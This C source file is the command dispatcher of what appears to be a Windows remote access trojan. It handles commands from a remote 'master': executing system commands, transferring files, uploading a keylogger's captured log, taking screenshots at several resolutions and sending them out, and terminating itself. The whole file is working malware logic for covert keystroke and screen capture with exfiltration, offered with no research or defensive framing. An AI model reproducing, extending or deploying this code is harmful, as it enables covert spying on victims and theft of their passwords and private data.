#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <dirent.h>
#include "types.h"
#include "net/interface.h"
#include "net/commands.h"
#include "keylogger.h"
#include "screenshot.h"

int net_ExecuteCmd(char* msg, int msgLen)
{
	int cmd = msg[0];
	*msg++;
	msgLen = strlen(msg);

	if(cmd == NET_CMD_ECHO)
	{
		return net_cmd_Echo(msg, msgLen);
	}else if(cmd == NET_CMD_INDENTIFY){
		return net_cmd_Indentify(msg, msgLen);
	}else if(cmd == NET_CMD_SYSTEM){
		return net_cmd_System(msg, msgLen);
	}else if(cmd == NET_CMD_SEND_FILE_MASTER_SLAVE){
		return net_cmd_MS(msg, msgLen);
	}else if(cmd == NET_CMD_SEND_FILE_SLAVE_MASTER){
		if(!strcmp(msg, "keylogger_path"))
		{
			keylogger_cmd = KEYLOGGER_CMD_BLOCK;
			fclose(flog);
			int rv = net_cmd_SM(keylogger_path, strlen(keylogger_path));
			keylogger_cmd = KEYLOGGER_CMD_CLEAR;

			return rv;
		}else if(!strcmp(msg, "screenshot_small")){
			char* path = screenshot_Make(0.2, 0.2);
			int rv = net_cmd_SM(path, strlen(path));
			remove(path);
			free(path);

			return rv;
		}else if(!strcmp(msg, "screenshot_half")){
			char* path = screenshot_Make(0.5, 0.5);
			int rv = net_cmd_SM(path, strlen(path));
			remove(path);

			return rv;
		}else if(!strcmp(msg, "screenshot_full")){
			char* path = screenshot_Make(1, 1);
			int rv = net_cmd_SM(path, strlen(path));
			remove(path);

			return rv;
		}

		return net_cmd_SM(msg, msgLen);
	}else if(cmd == NET_CMD_KEYLOGGER_CLEAR){
		return net_cmd_kl_Clear(msg, msgLen);
	}else if(cmd == NET_CMD_TERMINATE){
		exit(0);
	}
	
	return 1;
}
